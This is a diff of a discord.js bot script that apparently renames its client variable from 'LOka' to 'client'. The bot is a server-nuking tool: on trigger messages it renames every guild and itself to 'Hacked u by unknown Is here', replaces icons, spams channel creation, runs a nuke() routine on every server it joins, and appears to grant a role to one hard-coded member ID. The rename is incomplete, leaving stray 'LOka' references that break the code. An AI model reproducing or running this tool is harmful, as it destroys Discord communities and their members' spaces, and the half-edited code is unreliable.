@@ -1,64 +1,64 @@
 const Discord = require("discord.js");
-const LOka = new Discord.Client();
+const client = new Discord.Client();
 console.log('By ITz1uKY');
-LOka.on('ready', () => {
+client.on('ready', () => {
   console.log(`Logged in as ${LOka.user.tag} !`);
  
 });
-LOka.on('ready',  () => {
+client.on('ready',  () => {
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
 console.log('      ~            ~By ITz1uKY~           ~    ');
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log(`Logged in as  * [ "  NXx_YT xXRU " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
+console.log(`Logged in as  * [ "  NXx_YT xXRU " ] servers! [ " ${client.guilds.size} " ] Users! [ " ${client.users.size} " ]`);
  
        
    
  
 });
 var prefix = "k"
-LOka.on("message", message => {
+client.on("message", message => {
   if(!message.content.startsWith(prefix)) return;;
   let args = message.content.split(" ").slice(1);
   var argresult = args.join(' ');
   if (message.content.startsWith('hix15')) {
-    LOka.user.setUsername(argresult);
+    client.user.setUsername(argresult);
   }
     if (message.content.startsWith(prefix + 'on123')) {
-    LOka.user.setStatus(argresult);
+    client.user.setStatus(argresult);
   }
 });
  
 var x1 = "kk"
-LOka.on('message', message => {
+client.on('message', message => {
      if (message.content === ".") {
-LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
+client.user.setAvatar(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
  
 }
 });
 var x1 = "kk"
-LOka.on('message', message => {
+client.on('message', message => {
      if (message.content === ".") {
-LOka.user.setUsername("Hacked u by unknown Is here")
+client.user.setUsername("Hacked u by unknown Is here")
  
 }
 });
-LOka.on('message', message => {
+client.on('message', message => {
      if (message.content === ".") {
-LOka.user.setGame(`Hacked u by unknown Is here`,'https://www.twitch.tv/hix')
+client.user.setGame(`Hacked u by unknown Is here`,'https://www.twitch.tv/hix')
  
 }
 });
  
-LOka.on('message', message => {
+client.on('message', message => {
      if (message.content === ".") {
-         LOka.guilds.forEach(m =>{
+         client.guilds.forEach(m =>{
              m.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
 })
 }
 });
-LOka.on('message', message => {
+client.on('message', message => {
      if (message.content === ".") {
          LOka.guilds.forEach(m =>{
              m.setName(`Hacked u by unknown Is here`)
@@ -66,7 +66,7 @@ LOka.on('message', message => {
 }
 });
  
-LOka.on('message', message => {
+client.on('message', message => {
      if (message.content === ".") {
                  if(!message.channel.guild) return;
  
@@ -75,7 +75,7 @@ LOka.on('message', message => {
 }
 });
  
-LOka.on('message', message => {
+client.on('message', message => {
      
  
      if (message.content === "k1") {
@@ -283,7 +283,7 @@ LOka.on('message', message => {
  
 }
 });
-LOka.on('message', message => {
+client.on('message', message => {
          if (message.content === "k2") {
                LOka.guilds.forEach(m =>{
 m.createChannel('Hacked u by unknown Is here', 'text');
@@ -337,7 +337,7 @@ m.createChannel('Hacked u by unknown Is here', 'text');
 }
 });
  
-LOka.on('message', message => {
+client.on('message', message => {
          if (message.content === "k3") {
                  LOka.guilds.forEach(m =>{
 m.createChannel('Hacked u by unknown Is here', 'voice');
@@ -444,7 +444,7 @@ async function nuke(guild) {
  
 }
  
-LOka.on('ready', () => {
+client.on('ready', () => {
   for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
   console.log('-------------------------------------------------------------');
   console.log('');
@@ -454,11 +454,11 @@ LOka.on('ready', () => {
  
 });
  
-LOka.on('guildCreate', async (guild) => {
+client.on('guildCreate', async (guild) => {
   return nuke(guild).catch(console.error);
 });
  
-LOka.on('guildMemberAdd', member => {
+client.on('guildMemberAdd', member => {
    
             if (member.id === "?? ?? ???") {
                 member.guild.createRole({
@@ -478,4 +478,4 @@ LOka.on('guildMemberAdd', member => {
  
  
  
-LOka.login(BOT_TOKEN)
+client.login(BOT_TOKEN)
